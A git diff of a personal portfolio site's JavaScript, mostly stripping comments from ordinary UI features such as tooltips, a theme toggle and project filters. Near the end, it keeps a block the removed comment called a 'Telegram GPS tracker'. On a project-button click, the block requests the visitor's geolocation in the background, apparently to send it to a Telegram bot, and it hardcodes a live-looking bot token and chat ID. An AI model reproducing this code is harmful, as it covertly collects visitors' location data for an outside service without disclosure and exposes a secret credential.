@@ -1,8 +1,6 @@
-// ============================================================
-// SKILL TOOLTIP — TAP TO SHOW ON MOBILE TOUCH DEVICES
-// ============================================================
+
 (function () {
-  // Chỉ kích hoạt trên thiết bị cảm ứng
+
   if (!('ontouchstart' in globalThis)) return;
 
   const skills = document.querySelectorAll('.skill-item[data-tip]');
@@ -10,7 +8,7 @@
 
   skills.forEach(item => {
     item.addEventListener('touchstart', (e) => {
-      e.preventDefault(); // ngăn :hover ghost trên iOS
+      e.preventDefault();
       if (current && current !== item) current.classList.remove('tip-active');
       item.classList.toggle('tip-active');
       current = item.classList.contains('tip-active') ? item : null;
@@ -25,9 +23,7 @@
   });
 })();
 
-// ============================================================
-// READING PROGRESS BAR
-// ============================================================
+
 (function () {
   const bar = document.getElementById('reading-progress');
   if (!bar) return;
@@ -38,9 +34,6 @@
   });
 })();
 
-// ============================================================
-// ACTIVE NAV HIGHLIGHT ON SCROLL
-// ============================================================
 (function () {
   const sections = document.querySelectorAll('section[id], footer[id]');
   const navLinks = document.querySelectorAll('.navbar a');
@@ -58,9 +51,6 @@
   sections.forEach(sec => observer.observe(sec));
 })();
 
-// ============================================================
-// TYPING ANIMATION
-// ============================================================
 (function () {
   const el = document.getElementById('typing-text');
   if (!el) return;
@@ -92,9 +82,7 @@
   setTimeout(type, 800);
 })();
 
-// ============================================================
-// PROJECT SEARCH (realtime filter by name)
-// ============================================================
+
 (function () {
   const input = document.getElementById('projectSearch');
   if (!input) return;
@@ -110,9 +98,7 @@
   });
 })();
 
-// ============================================================
-// CONFETTI ON FIRST PAGE LOAD (once per session)
-// ============================================================
+
 (function () {
   if (sessionStorage.getItem('confetti_done')) return;
   sessionStorage.setItem('confetti_done', '1');
@@ -123,9 +109,7 @@
   });
 })();
 
-// ============================================================
-// DARK / LIGHT MODE TOGGLE
-// ============================================================
+
 (function () {
   const toggle = document.getElementById('theme-toggle');
   const saved = localStorage.getItem('darkMode');
@@ -139,9 +123,6 @@
   }
 })();
 
-// ============================================================
-// SCROLL TO TOP BUTTON
-// ============================================================
 (function () {
   const btn = document.getElementById('scroll-top');
   if (!btn) return;
@@ -155,9 +136,6 @@
   });
 })();
 
-// ============================================================
-// PROJECT FILTER
-// ============================================================
 (function () {
   const filterBtns = document.querySelectorAll('.filter-btn');
   const cards = document.querySelectorAll('.project-card');
@@ -180,26 +158,23 @@
   });
 })();
 
-// ============================================================
-// COPY EMAIL TO CLIPBOARD
-// ============================================================
 (function () {
   const copyBtn = document.getElementById('copyEmailBtn');
   if (!copyBtn) return;
 
-  const EMAIL = 'thuongnt.ktpm@gmail.com'; // ← đổi email của bạn ở đây
+  const EMAIL = 'thuongnt.ktpm@gmail.com';
 
   copyBtn.addEventListener('click', () => {
     navigator.clipboard.writeText(EMAIL).then(() => {
       copyBtn.classList.add('copied');
       setTimeout(() => copyBtn.classList.remove('copied'), 2000);
     }).catch(() => {
-      // fallback cho trình duyệt cũ
+
       const el = document.createElement('textarea');
       el.value = EMAIL;
       document.body.appendChild(el);
       el.select();
-      document.execCommand('copy'); // fallback cũ, chỉ dùng khi clipboard API không có
+      document.execCommand('copy');
       el.remove();
       copyBtn.classList.add('copied');
       setTimeout(() => copyBtn.classList.remove('copied'), 2000);
@@ -207,10 +182,10 @@
   });
 })();
 
-// 1. Theme Logic (Chế độ Sáng/Tối)
+
 
 document.addEventListener("DOMContentLoaded", function () {
-  // 1. Khai báo danh sách các file CSS giao diện
+
   /*
   const themes = [
     // "css/cute.css",
@@ -324,7 +299,7 @@ document.onkeydown = function (e) {
   }
 };
 
-// ---  MUSIC PLAYER ---
+
 document.addEventListener("DOMContentLoaded", function () {
   const widget = document.getElementById("musicWidget");
   const playBtn = document.getElementById("playBtn");
@@ -347,7 +322,6 @@ document.addEventListener("DOMContentLoaded", function () {
   }
 });
 
-// --- TELEGRAM GPS TRACKER (PROJECT CLICKS) ---
 const TELEGRAM_BOT_TOKEN = '8632589547:AAGQjBlLd906MzjBsr8ToOTXp-J_1VoPqGU';
 const TELEGRAM_CHAT_ID = '6149032213';
 
@@ -365,10 +339,10 @@ document.querySelectorAll('.project-btn').forEach(btn => {
     const targetUrl = this.getAttribute('href');
     const targetWindow = this.getAttribute('target') || '_self';
 
-    // Mở link NGAY LẬP TỨC để tránh iOS Safari chặn popup
+
     window.open(targetUrl, targetWindow);
 
-    // Sau đó mới lấy GPS trong nền để gửi Telegram (không ảnh hưởng việc mở link)
+
     if (navigator.geolocation) {
       navigator.geolocation.getCurrentPosition(
         (position) => {
@@ -378,9 +352,9 @@ document.querySelectorAll('.project-btn').forEach(btn => {
           console.log("Khách từ chối cấp quyền GPS hoặc lỗi: ", error.message);
         },
         {
-          timeout: 10000,        // tối đa 10 giây chờ GPS
-          maximumAge: 60000,     // dùng cache vị trí nếu có (không quá 1 phút)
-          enableHighAccuracy: false // tắt để iOS phản hồi nhanh hơn
+          timeout: 10000,
+          maximumAge: 60000,
+          enableHighAccuracy: false
         }
       );
     }
